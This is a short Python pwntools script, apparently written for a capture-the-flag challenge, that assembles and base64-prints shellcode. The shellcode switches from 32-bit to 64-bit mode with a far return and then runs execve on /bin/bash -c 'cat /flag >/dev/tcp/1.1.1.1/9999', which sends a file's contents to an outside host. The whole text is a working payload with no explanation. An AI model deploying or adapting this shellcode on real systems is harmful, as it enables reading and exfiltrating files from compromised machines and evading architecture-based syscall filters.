#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

from pwn import *
code="""
.code32
    call to64
.code64
    push 0x3b
    pop rax
    push 0
    call getsh
    .ascii "/bin/bash"
    .byte 0
getsh:
    pop rdi
    push 0
    call get_cmd
    .ascii "cat /flag >/dev/tcp/1.1.1.1/9999"
    .byte 0
get_cmd:
    call get_c
    .ascii "-c"
    .byte 0
get_c:
    push rdi
    mov rsi,rsp
    xor rdx,rdx
    syscall
.code32
to64:
    mov word ptr[esp+0x4],0x33
    retf
"""

shell=asm(code)
print shell.encode("base64")
